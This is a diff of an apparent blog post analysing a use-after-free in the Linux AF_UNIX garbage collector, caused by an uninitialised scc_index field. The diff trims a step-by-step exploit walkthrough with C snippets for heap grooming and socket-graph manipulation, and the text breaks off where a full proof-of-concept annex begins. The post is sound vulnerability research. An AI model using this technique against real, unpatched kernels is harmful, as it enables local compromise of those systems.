@@ -175,8 +175,8 @@
 
     <div class="post-content">
         <h2 id="introduction">Introduction</h2>
-<p>The AF_UNIX garbage collector is a small but fascinating corner of the kernel. It exists because a socket can be made unreachable from user-space while still being kept alive by the kernel, through the <code>SCM_RIGHTS</code> ancillary-data mechanism. In 2024 the subsystem was rewritten from scratch on top of a graph/SCC model; in 2025 an uninitialised-field bug in that rewrite was turned into a kCTF entry as <strong>CVE-2025-40214</strong>.</p>
-<p>This post walks the rewrite end-to-end, reaches the bug, and then presents two reproducers — the canonical three-stage advisory variant (stream listener + embryo redirection) and a simpler four-socket variant I put together while building the PoC.</p>
+<p>The AF_UNIX garbage collector is an interesting piece of the kernel. It exists because sockets can be sent with SCM_RIGHTS but they can become unreachable from user-space while still being kept alive by the kernel, which is not memory efficient; in this situation, the garbage collector intervenes to free them. Not long ago, the subsystem was rewritten from scratch on top of a graph/Strongly-Connected-Components model; but it is still bug prone.
+This post walks the rewrite end-to-end, and discusses a Use-After-Free bug.</p>
 <hr>
 <h2 id="af_unix-garbage-collector--background">AF_UNIX Garbage Collector — Background</h2>
 <p>A per-subsystem garbage collector is responsible for reclaiming kernel objects that can no longer be reached through user-space handles. For AF_UNIX, the entry point is <code>unix_gc()</code>:</p>
@@ -350,7 +350,7 @@
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Indexing starts at <code>UNIX_VERTEX_INDEX_START == 2</code>. At the top of the walk the graph is <em>assumed</em> acyclic; the walk promotes it back to cyclic if and only if it actually finds a cycle.</p>
 <blockquote>
-<p><strong>Complexity note.</strong> The outer <code>while</code> only iterates more than once when the graph is a <em>forest</em> of disconnected sub-graphs. For any weakly-connected graph a single iteration visits every vertex. End-to-end cost is <code>O(|V| + |E|)</code>.</p>
+<p><strong>Complexity note.</strong> The outer <code>while</code> only iterates more than once when the graph is a <em>forest</em> of disconnected sub-graphs. For any weakly-connected graph G(V, E) a single iteration visits every vertex. End-to-end cost is <code>O(|V| + |E|)</code>.</p>
 </blockquote>
 <h3 id="tarjans-algorithm">Tarjan&rsquo;s algorithm</h3>
 <p>Tarjan&rsquo;s algorithm takes a directed graph and produces its SCCs. Each vertex ends up in exactly one SCC; vertices with no incoming or outgoing cycle form a trivial singleton SCC. The idea is a DFS where every vertex starts labelled <code>(index, scc_index) = (k, k)</code> for a monotonically increasing <code>k</code>, and then neighbours&rsquo; <code>scc_index</code> values are propagated back up the stack so that all vertices in a cycle converge on the smallest <code>scc_index</code> in that cycle.</p>
@@ -494,492 +494,39 @@
 </span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    /* Visit every vertex exactly once.
 </span></span><span style="display:flex;"><span>     * __unix_walk_scc() moves visited vertices to unix_visited_vertices.
-</span></span></code></pre></div><h3 id="root-cause-in-one-sentence">Root cause in one sentence</h3>
-<p><code>unix_add_edge()</code> initialises a freshly-allocated <code>struct unix_vertex</code>&rsquo;s <code>index</code>, <code>out_degree</code>, <code>edges</code>, and <code>scc_entry</code> fields — but <strong>not</strong> <code>scc_index</code>. That field reads back whatever the previous slab occupant wrote there. The fast-path dead-SCC check (<code>unix_vertex_dead()</code>) compares <code>scc_index</code> across vertices to decide whether an outgoing edge leaves the SCC:</p>
+</span></span></code></pre></div><h3 id="root-cause">Root cause:</h3>
+<p>unix_add_edge() initialises a freshly-allocated struct unix_vertex’s index, out_degree, edges, and scc_entry fields, but not scc_index. That field reads back whatever the previous slab occupant wrote there. The fast-path dead-SCC check (unix_vertex_dead()) compares scc_index across vertices to decide whether an outgoing edge leaves the SCC:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (next_vertex<span style="color:#f92672">-&gt;</span>scc_index <span style="color:#f92672">!=</span> vertex<span style="color:#f92672">-&gt;</span>scc_index)
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> false;   <span style="color:#75715e">/* edge leaves the SCC → vertex not dead */</span>
-</span></span></code></pre></div><p>If we can arrange for a freshly-allocated vertex to inherit the <em>same</em> <code>scc_index</code> value as a live, user-held socket&rsquo;s vertex, the dead-SCC check returns <code>true</code> on the live socket and its receive queue is purged — a logical use-after-free of every file it was carrying.</p>
+</span></span></code></pre></div><p>If we can arrange for a freshly-allocated vertex to inherit the <em>same</em> <code>scc_index</code> value as a live, user-held socket’s vertex, the dead-SCC check returns <code>true</code> on the live socket and its receive queue is purged; result: a logical use-after-free of every file it was carrying.</p>
 <p>The patch fixes this unconditionally with a monotonically increasing <code>unix_vertex_max_scc_index</code> counter assigned on every fresh <code>unix_add_edge()</code>, guaranteeing no accidental aliasing can ever happen.</p>
-<h3 id="canonical-three-stage-exploit">Canonical three-stage exploit</h3>
-<p>The published advisory summary is terse:</p>
-<blockquote>
-<ol>
-<li>heap spray, 2) build <code>A→embryo(B)</code> and <code>X→X</code> + slow GC, 3) <code>accept(B)</code>, <code>B→C</code>, <code>close(A)</code>, fast GC</li>
-</ol>
-</blockquote>
-<p>Each stage has non-obvious mechanics. Let&rsquo;s walk them.</p>
-<h4 id="stage-1--slab-feng-shui-priming-scc_index--2-on-the-freelist">Stage 1 — slab feng-shui: priming <code>scc_index == 2</code> on the freelist</h4>
-<p><code>struct unix_vertex</code> is <strong>72 bytes</strong> on x86_64, so it lands in the <strong><code>kmalloc-96</code></strong> cache. To make the bug deterministic, we need the top of that cache&rsquo;s freelist to hold a vertex whose <code>scc_index</code> field contains <code>UNIX_VERTEX_INDEX_START == 2</code>.</p>
-<p>The recipe: build a ring of N cyclic AF_UNIX sockets, close all local fds, trigger GC. The slow walk visits every vertex, runs Tarjan, and finalises each SCC with:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>vertex<span style="color:#f92672">-&gt;</span>index     <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>last_index;
-</span></span><span style="display:flex;"><span>vertex<span style="color:#f92672">-&gt;</span>scc_index <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>last_index;
-</span></span><span style="display:flex;"><span>(<span style="color:#f92672">*</span>last_index)<span style="color:#f92672">++</span>;
-</span></span></code></pre></div><p>For the first SCC, <code>last_index == UNIX_VERTEX_INDEX_START == 2</code>. Because our ring forms one big SCC, every vertex in it gets <code>scc_index = 2</code> before being freed as part of the hit-list. Those vertices land back on the <code>kmalloc-96</code> freelist <strong>with <code>scc_index = 2</code> still written</strong> — <code>kfree()</code> doesn&rsquo;t zero payloads.</p>
-<p>A later <code>kmalloc(sizeof(struct unix_vertex), GFP_KERNEL)</code> pops off this primed freelist and reads back <code>scc_index = 2</code> from uninitialised memory.</p>
-<p>Two subtle points:</p>
-<ol>
-<li><strong>Don&rsquo;t pollute the freelist afterwards.</strong> Any vertex allocated <em>after</em> stage 1 that goes through a slow walk will be assigned a fresh index (3, 4, 5…) and then freed, pushing a non-2 slot to the top of the LIFO freelist. Our <code>kick_gc()</code> helper therefore avoids <code>sendmsg(SCM_RIGHTS)</code> — it opens and closes a bare DGRAM socket to trigger <code>unix_release_sock → unix_gc()</code> without allocating any vertex.</li>
-<li><strong>One round of ~100 sockets is plenty.</strong> The freelist is LIFO; we only need the few topmost slots primed.</li>
-</ol>
-<h4 id="stage-2--painting-sk-a-with-a-legitimate-scc_index--2">Stage 2 — painting <code>sk-A</code> with a <em>legitimate</em> <code>scc_index = 2</code></h4>
-<p>Now we need a <strong>live</strong> socket (<code>sk-A</code>) whose vertex has <code>scc_index = 2</code> for real — written by the slow walk, not read from residue — so that later, a freshly-allocated vertex with stale <code>scc_index = 2</code> will alias it.</p>
-<ul>
-<li>Create an AF_UNIX DGRAM <code>sk-A</code>.</li>
-<li>Create another DGRAM <code>sk-X</code> and send it to itself: <code>sendmsg(sk-X, SCM_RIGHTS=sk-X)</code>. This is a self-loop — a 1-vertex cyclic SCC — that flips <code>unix_graph_maybe_cyclic = true</code> so GC will actually run later.</li>
-</ul>
-<p>The interesting move is the <strong>embryo redirection</strong> on <code>sk-A</code>. We want <code>sk-A</code> inflight, but with a graph shape that makes stale aliasing work in stage 3. The way to get there is to push <code>sk-A</code> through a stream listener&rsquo;s accept queue <em>before anyone accepts</em>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> listener <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_stream_listener</span>(...);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> client   <span style="color:#f92672">=</span> <span style="color:#a6e22e">connect_stream</span>(...);      <span style="color:#75715e">/* creates an embryo on listener */</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">send_fd</span>(client, sk<span style="color:#f92672">-</span>A, NULL, <span style="color:#ae81ff">0</span>);          <span style="color:#75715e">/* sk-A → embryo&#39;s recv queue */</span>
-</span></span></code></pre></div><p>At the moment of the send, the embryo isn&rsquo;t a first-class inflight socket yet — it&rsquo;s still attached to <code>listener</code>. The graph code has a redirect for this case:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> unix_vertex <span style="color:#f92672">*</span><span style="color:#a6e22e">unix_edge_successor</span>(<span style="color:#66d9ef">struct</span> unix_edge <span style="color:#f92672">*</span>edge)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (edge<span style="color:#f92672">-&gt;</span>successor<span style="color:#f92672">-&gt;</span>listener)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">unix_sk</span>(edge<span style="color:#f92672">-&gt;</span>successor<span style="color:#f92672">-&gt;</span>listener)<span style="color:#f92672">-&gt;</span>vertex;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> edge<span style="color:#f92672">-&gt;</span>successor<span style="color:#f92672">-&gt;</span>vertex;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>So <code>sk-A</code>&rsquo;s outgoing edge resolves to <strong><code>listener-&gt;vertex</code></strong>, <em>not</em> to any embryo vertex. That matters because when we <code>accept()</code> in stage 3, <code>unix_update_edges()</code> flips <code>sk-B-&gt;listener = NULL</code> and the same edge starts resolving to <code>sk-B-&gt;vertex</code>, which at that moment is <code>NULL</code> (sk-B has never been a predecessor — no vertex has been lazily allocated for it).</p>
-<p>After the slow walk in this stage, Tarjan produces:</p>
-<ul>
-<li><code>sk-A-&gt;vertex-&gt;scc_index = 2</code> (first SCC encountered)</li>
-<li><code>sk-X-&gt;vertex-&gt;scc_index = 3</code> (second SCC)</li>
-<li><code>unix_graph_grouped = true</code></li>
-<li><code>unix_graph_maybe_cyclic = true</code> (the self-loop keeps it set)</li>
-</ul>
-<p><code>sk-A</code> now holds a legitimate <code>scc_index = 2</code>, the graph is marked grouped (so the next GC takes the fast path), and the <code>kmalloc-96</code> freelist still has stage-1&rsquo;s <code>scc_index = 2</code> residue on top — we sprayed them <em>before</em> the listener/sk-A/sk-X vertex allocations.</p>
-<h4 id="stage-3--aliasing-sk-bs-fresh-vertex-onto-sk-as-scc">Stage 3 — aliasing sk-B&rsquo;s fresh vertex onto sk-A&rsquo;s SCC</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> sk<span style="color:#f92672">-</span>B <span style="color:#f92672">=</span> <span style="color:#a6e22e">accept</span>(listener, NULL, NULL);
-</span></span></code></pre></div><p><code>accept()</code> calls <code>unix_update_edges(unix_sk(sk-B))</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">spin_lock</span>(<span style="color:#f92672">&amp;</span>unix_gc_lock);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">unix_update_graph</span>(<span style="color:#a6e22e">unix_sk</span>(receiver<span style="color:#f92672">-&gt;</span>listener)<span style="color:#f92672">-&gt;</span>vertex);
-</span></span><span style="display:flex;"><span>receiver<span style="color:#f92672">-&gt;</span>listener <span style="color:#f92672">=</span> NULL;
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">spin_unlock</span>(<span style="color:#f92672">&amp;</span>unix_gc_lock);
-</span></span></code></pre></div><p>Two effects: <code>sk-B-&gt;listener = NULL</code> (so <code>unix_edge_successor</code> on sk-A&rsquo;s edge now resolves to <code>sk-B-&gt;vertex</code>, still <code>NULL</code>), and <code>unix_update_graph()</code> is called on the <em>listener&rsquo;s</em> vertex. The latter sets <code>unix_graph_maybe_cyclic = UNIX_GRAPH_MAYBE_CYCLIC</code> and <code>unix_graph_grouped = false</code>, which would kill our fast-path premise — except that the listener has no live outgoing edges at that moment, so the net effect on the next walk is limited. The send that follows re-flips <code>unix_graph_grouped</code> back on.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">send_fd</span>(carrier, sk<span style="color:#f92672">-</span>B, <span style="color:#f92672">&amp;</span>sk<span style="color:#f92672">-</span>C_addr, sk<span style="color:#f92672">-</span>C_addrlen);
-</span></span></code></pre></div><p>This is where the bug actually arms. Inside <code>unix_add_edge()</code>:</p>
-<ol>
-<li><code>edge-&gt;predecessor = sk-B</code>. Since <code>sk-B-&gt;vertex == NULL</code>, we fall into the fresh-allocate branch:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>vertex <span style="color:#f92672">=</span> <span style="color:#a6e22e">list_first_entry</span>(<span style="color:#f92672">&amp;</span>fpl<span style="color:#f92672">-&gt;</span>vertices, ...);   <span style="color:#75715e">/* pops primed slab */</span>
-</span></span><span style="display:flex;"><span>vertex<span style="color:#f92672">-&gt;</span>index <span style="color:#f92672">=</span> unix_vertex_unvisited_index;
-</span></span><span style="display:flex;"><span>vertex<span style="color:#f92672">-&gt;</span>out_degree <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">INIT_LIST_HEAD</span>(<span style="color:#f92672">&amp;</span>vertex<span style="color:#f92672">-&gt;</span>edges);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">INIT_LIST_HEAD</span>(<span style="color:#f92672">&amp;</span>vertex<span style="color:#f92672">-&gt;</span>scc_entry);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/* scc_index NOT set — reads 2 from slab residue */</span>
-</span></span></code></pre></div></li>
-<li><code>unix_update_graph(unix_edge_successor(edge))</code> — successor is <code>sk-C</code>. <code>sk-C</code> was just made by <code>make_dgram()</code> and is not inflight, so <code>sk-C-&gt;vertex == NULL</code>, so <code>unix_update_graph(NULL)</code> returns early without touching <code>unix_graph_grouped</code>.</li>
-</ol>
-<p><strong>This is why sk-C must not be inflight.</strong> If sk-C were already a predecessor somewhere, <code>unix_update_graph()</code> would set <code>unix_graph_grouped = false</code> and knock us out of the fast path.</p>
-<blockquote>
-<p><strong>Why a DGRAM carrier for B→C?</strong> sk-B is an <em>accepted</em> <code>SOCK_STREAM</code>, already connected to the original client. <code>sendmsg()</code> on a connected stream with <code>msg_name</code> set returns <code>EISCONN</code>. Using an unconnected DGRAM socket as the actual syscall target routes the message via <code>msg_name</code>, while sk-B rides as the <code>SCM_RIGHTS</code> payload. <code>unix_add_edge</code> sets <code>edge-&gt;predecessor = sk-B</code> from the payload, not from the syscall target — so sk-B becomes the edge&rsquo;s predecessor regardless of who actually called <code>sendmsg()</code>.</p>
-</blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">close</span>(sk<span style="color:#f92672">-</span>A);
-</span></span></code></pre></div><p>sk-A had <code>file_count == 2</code> (our user fd + the inflight ref in sk-B&rsquo;s queue). Closing drops it to 1. sk-A&rsquo;s <code>out_degree == 1</code> (one outgoing edge into sk-B). The dead-check precondition <code>total_ref == out_degree</code> is now satisfied.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">kick_gc</span>();   <span style="color:#75715e">/* final GC — fires the bug */</span>
-</span></span></code></pre></div><p><code>unix_graph_grouped == true</code>, so fast path. <code>unix_walk_scc_fast()</code> iterates <code>unix_unvisited_vertices</code>; sk-A&rsquo;s vertex comes up:</p>
-<ul>
-<li>Walks its edges. One edge: <code>sk-A → sk-B</code>.</li>
-<li><code>next_vertex = unix_edge_successor(edge)</code> → <code>sk-B-&gt;vertex</code> (the stale one).</li>
-<li><code>next_vertex-&gt;scc_index</code> reads <strong>2</strong> (stale).</li>
-<li><code>vertex-&gt;scc_index</code> (sk-A&rsquo;s) is <strong>2</strong> (legitimate).</li>
-<li>The check <code>next_vertex-&gt;scc_index != vertex-&gt;scc_index</code> fails — the edge is declared to stay inside the SCC.</li>
-<li>No other edges. <code>total_ref == out_degree == 1</code>. Dead.</li>
-<li><code>[+] SCC DEAD Confirmed</code>. <code>unix_collect_skb()</code> splices sk-A&rsquo;s receive queue into the hit-list. <code>__skb_queue_purge()</code> frees every skb, calling <code>scm_destroy()</code> on each — <code>fput()</code> on every carried file.</li>
-</ul>
-<p><strong>sk-A was never actually unreachable from user-space.</strong> We held a file reference on it moments ago; it is still referenced from sk-B&rsquo;s queue. The GC just got the math wrong, because we made a fresh allocation inherit an <code>scc_index</code> that wasn&rsquo;t ours to inherit.</p>
-<h3 id="my-own-strategy--b--a--c--d-no-listener-no-embryo">My own strategy — <code>B ↔ A → C → D</code> (no listener, no embryo)</h3>
-<p>The advisory&rsquo;s embryo-redirection shape is elegant — it cleanly separates &ldquo;allocate sk-A&rsquo;s vertex with legitimate <code>scc_index=2</code>&rdquo; from &ldquo;allocate sk-B&rsquo;s vertex with stale <code>scc_index=2</code>&rdquo; via the <code>listener → embryo</code> redirect. But the bug does not actually <em>require</em> a listener. Any graph shape that (a) makes the slow walk paint a live socket&rsquo;s vertex with <code>scc_index=2</code>, and (b) leaves <code>unix_graph_grouped=true</code> with stale-2 vertices still on the freelist, is enough.</p>
-<p>My own strategy drops the listener entirely and uses a direct two-socket cycle as both the priming cycle <em>and</em> the source of <code>scc_index=2</code> residue:</p>
-<pre tabindex="0"><code>Stage 2:  B ↔ A           (two-socket SCC → scc_index=2 on both)
-Stage 3:  A → C → D       (fresh vertex allocs, stale scc_index=2)
-          close A, close B
-          GC → fast path → A wrongly declared dead
-          recv_fd(skC) pulls A back out → write() on the UAF fd
-</code></pre><p>What each stage does:</p>
-<h4 id="stage-2--b--a-cycle">Stage 2 — <code>B ↔ A</code> cycle</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> skA <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_dgram</span>(<span style="color:#f92672">&amp;</span>aAddr, <span style="color:#f92672">&amp;</span>aLen);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> skB <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_dgram</span>(<span style="color:#f92672">&amp;</span>bAddr, <span style="color:#f92672">&amp;</span>bLen);
+<p>The author <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=60e6489f8e3b086bd1130ad4450a2c112e863791">described his strategy</a> to produce the bug:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span>) heap spray to shape the <span style="color:#960050;background-color:#1e0010">`</span>out_degree<span style="color:#960050;background-color:#1e0010">`</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">2</span>) build A<span style="color:#960050;background-color:#1e0010">→</span><span style="color:#a6e22e">embryo</span>(B) and X<span style="color:#960050;background-color:#1e0010">→</span>X <span style="color:#f92672">+</span> slow GC
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">3</span>) <span style="color:#a6e22e">accept</span>(B), B<span style="color:#960050;background-color:#1e0010">→</span>C, <span style="color:#a6e22e">close</span>(A), fast GC
+</span></span></code></pre></div><p>Through reading this, i devised another strategy which is still very close to the author’s:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span>) Still <span style="color:#66d9ef">do</span> the spraying
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">2</span>) B <span style="color:#960050;background-color:#1e0010">↔</span> <span style="color:#a6e22e">A</span>           (two<span style="color:#f92672">-</span>socket SCC <span style="color:#960050;background-color:#1e0010">→</span> scc_index<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> on both)
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">3</span>) A <span style="color:#960050;background-color:#1e0010">→</span> C
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span>) C <span style="color:#960050;background-color:#1e0010">→</span> D
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">send_fd</span>(skA, skA, <span style="color:#f92672">&amp;</span>bAddr, bLen);   <span style="color:#75715e">/* sk-A → sk-B&#39;s queue */</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">send_fd</span>(skB, skB, <span style="color:#f92672">&amp;</span>aAddr, aLen);   <span style="color:#75715e">/* sk-B → sk-A&#39;s queue */</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">kick_gc</span>();                         <span style="color:#75715e">/* slow walk */</span>
-</span></span></code></pre></div><p>After the slow walk, both vertices belong to one two-vertex SCC, both get <code>scc_index = 2</code> (first SCC encountered). Neither socket is freed — both still have a live user fd — but <code>unix_graph_grouped</code> flips to <code>true</code> and the fast path is armed for the next GC.</p>
-<p>The cycle itself is cyclic, so <code>unix_graph_maybe_cyclic</code> stays true for free. That <strong>removes the need for the <code>sk-X → sk-X</code> self-loop</strong> from the embryo variant — one fewer socket, one fewer state transition.</p>
-<h4 id="stage-3--spurious-chain-then-close-and-trigger">Stage 3 — spurious chain, then close and trigger</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> skC <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_dgram</span>(<span style="color:#f92672">&amp;</span>cAddr, <span style="color:#f92672">&amp;</span>cLen);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> skD <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_dgram</span>(<span style="color:#f92672">&amp;</span>dAddr, <span style="color:#f92672">&amp;</span>dLen);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">send_fd</span>(skA, skA, <span style="color:#f92672">&amp;</span>cAddr, cLen);   <span style="color:#75715e">/* sk-A → sk-C */</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">send_fd</span>(skC, skC, <span style="color:#f92672">&amp;</span>dAddr, dLen);   <span style="color:#75715e">/* sk-C → sk-D */</span>
-</span></span></code></pre></div><p>Each send through a previously-non-predecessor socket triggers a fresh <code>unix_vertex</code> kmalloc in <code>unix_add_edge()</code>. The freelist still has stage-1&rsquo;s <code>scc_index=2</code> residue on top, so every new vertex reads back <code>scc_index = 2</code>.</p>
-<p><code>sk-C</code> and <code>sk-D</code> are both fresh DGRAMs that were not inflight at send time, so <code>unix_update_graph(successor)</code> resolves to <code>NULL</code> for each and <code>unix_graph_grouped</code> stays true. Fast path stays armed.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">close</span>(skA);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">close</span>(skB);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">kick_gc</span>();
-</span></span></code></pre></div><p><code>close(skA)</code> drops its <code>file_count</code> to match <code>out_degree</code> — the dead-check precondition. The fast path runs, and because <code>sk-A</code>&rsquo;s legitimate <code>scc_index=2</code> aliases the fresh-and-stale <code>scc_index=2</code> on the <code>sk-A→sk-C</code> edge&rsquo;s successor, <code>unix_vertex_dead(sk-A)</code> returns true and sk-A&rsquo;s receive queue is purged.</p>
+</span></span><span style="display:flex;"><span>    close A, close B
+</span></span><span style="display:flex;"><span>    GC <span style="color:#960050;background-color:#1e0010">→</span> fast path <span style="color:#960050;background-color:#1e0010">→</span> A wrongly declared dead
+</span></span></code></pre></div><p><strong>Stage 1 - Spraying vertices</strong></p>
+<p><code>struct unix_vertex</code> is <strong>72 bytes</strong> on x86_64, so it lands in the <strong><code>kmalloc-96</code></strong> cache. To make the bug deterministic, we need the top of that cache’s freelist to hold a vertex whose <code>scc_index</code> field contains <code>UNIX_VERTEX_INDEX_START == 2</code>.</p>
+<p>So that, we build a ring of N(&gt; 1) cyclic AF_UNIX sockets, close all local fds to trigger GC. The slow walk visits every vertex, runs Tarjan; and because our ring forms one SCC, every vertex in it gets <code>scc_index = 2</code> before being freed as part of the hit-list. Those vertices land back on the <code>kmalloc-96</code> freelist <strong>with <code>scc_index = 2</code></strong> still written.</p>
+<p><strong>Stage 2 - <code>B ↔ A</code> cycle</strong></p>
+<p>After creating the cycle, the slow walk gives both A &amp; B <code>scc_index = 2</code> and neither is freed. <code>unix_graph_grouped</code> flips to <code>true</code> and the fast path is armed for the next GC.</p>
+<p>The cycle itself is cyclic, so <code>unix_graph_maybe_cyclic</code> stays true for free. That <strong>removes the need for the <code>sk-X → sk-X</code></strong> self-loop from the embryo variant.</p>
+<p><strong>Stage 3 - spurious chain, then close and trigger</strong></p>
+<p>Each send through a previously-non-predecessor socket triggers a fresh <code>unix_vertex</code> kmalloc in <code>unix_add_edge()</code>. The freelist still has stage-1’s <code>scc_index=2</code> residue on top, so every new vertex reads back <code>scc_index = 2</code>.</p>
+<p><code>sk-C</code> and <code>sk-D</code> are not inflight at send time, so <code>unix_update_graph(successor)</code> resolves to <code>NULL</code> for each and <code>unix_graph_grouped</code> stays true. Fast path stays armed.</p>
+<p><code>close(skA)</code> drops its <code>file_count</code> to match <code>out_degree</code> ( the dead-check precondition). The fast path runs, and because <code>sk-A</code>’s legitimate <code>scc_index=2</code> aliases the fresh-and-stale <code>scc_index=2</code> on the <code>sk-A→sk-C</code> edge’s successor, <code>unix_vertex_dead(sk-A)</code> returns true and sk-A’s receive queue is purged.</p>
 <p><img src="/Qdiv7/images/gc_remastered/Screenshot-gc-4.png" alt=""></p>
 <p>On a vulnerable kernel with the printk patch from the annex added:</p>
 <pre tabindex="0"><code>[+] SCC DEAD Confirmed : Right before returning &#39;true&#39; in unix_vertex_dead()
-</code></pre><hr>
-<h2 id="annex-1--full-poc-embryo--listener-variant">Annex 1 — full PoC (embryo / listener variant)</h2>
-<p>The canonical three-stage reproducer, ported from the advisory and instrumented with the pipe-EPIPE oracle. Build:</p>
-<pre tabindex="0"><code>gcc -O2 -Wall -o poc_unix_gc_scc_index_uaf poc_unix_gc_scc_index_uaf.c
-</code></pre><p>Run inside a VM you control on a kernel with the <code>scc_index</code> bug unpatched. For the kernel-side trace referenced in the <em>Observable signature</em> section, add the following printks to <code>net/unix/garbage.c</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* in unix_add_edge, after list_add_tail(&amp;edge-&gt;vertex_entry, ...) */</span>
